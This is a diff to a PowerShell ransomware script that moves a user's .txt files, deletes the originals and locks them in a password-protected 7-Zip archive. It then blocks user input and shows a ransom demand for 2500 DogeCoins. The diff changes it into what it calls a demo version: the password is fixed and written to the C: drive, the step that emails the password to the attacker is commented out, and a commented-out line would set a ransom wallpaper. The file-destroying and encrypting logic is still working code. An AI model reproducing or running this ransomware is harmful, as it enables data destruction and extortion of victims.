@@ -48,9 +48,14 @@ $Destination = "C:\Users\(username)\Desktop\StolenFiles"
 #Copy all files with certain extension and delete them in the source location
 $cp = robocopy /mov $Source $Destination *.txt /s
 
-#Generate a random 8 character password
+#Set the password to password
 [Reflection.Assembly]::LoadWithPartialName("System.Web")
-$randomPassword = [System.Web.Security.Membership]::GeneratePassword(8,2)
+#The old cold generated a random password
+#$randomPassword = [System.Web.Security.Membership]::GeneratePassword(8,2)
+$randomPassword = "password"
+
+#@@SC: Piping password out to C for demo purposes
+$randomPassword | Out-File -FilePath "c:\RansomeLockedPassword.txt" -Force
 
 #Set source for 7zip exe (usually the same path in most basic computers)
 $pathTo64Bit7Zip = "C:\Program Files\7-Zip\7z.exe"
@@ -63,6 +68,7 @@ $p = Start-Process $pathTo64Bit7Zip -ArgumentList $arguments -Wait -PassThru -Wi
 #Delete the destination folder
 $del = Remove-Item $Destination -Force -Recurse
 
+<# @@SC: Commenting out email section
 $email = "(enter email address you want files sent to)"
 
 #Send password for files to your e-mail
@@ -94,7 +100,7 @@ $Mailer.send($Msg)
 $Attachment.Dispose()
 $Msg.Dispose()
 $Mailer.Dispose()
-
+#>
 #Delete the zip file created
 $del = Remove-Item $ZipFolder -Force -Recurse
 
@@ -104,6 +110,9 @@ $userInput::BlockInput($false)
 #Display a message demanding money
 #Add the required .NET assembly for message display
 Add-Type -AssemblyName System.Windows.Forms
+
+#Set the background to ransomware
+#set-itemproperty -path "HKCU:Control Panel\Desktop" -name WallPaper -value accipiter.png
 
 #Show the message
 $result = [System.Windows.Forms.MessageBox]::Show('We have some of your important files!!! We demand 2500 DogeCoins for their return.', '!-Notice-!', 'Ok', 'Warning')
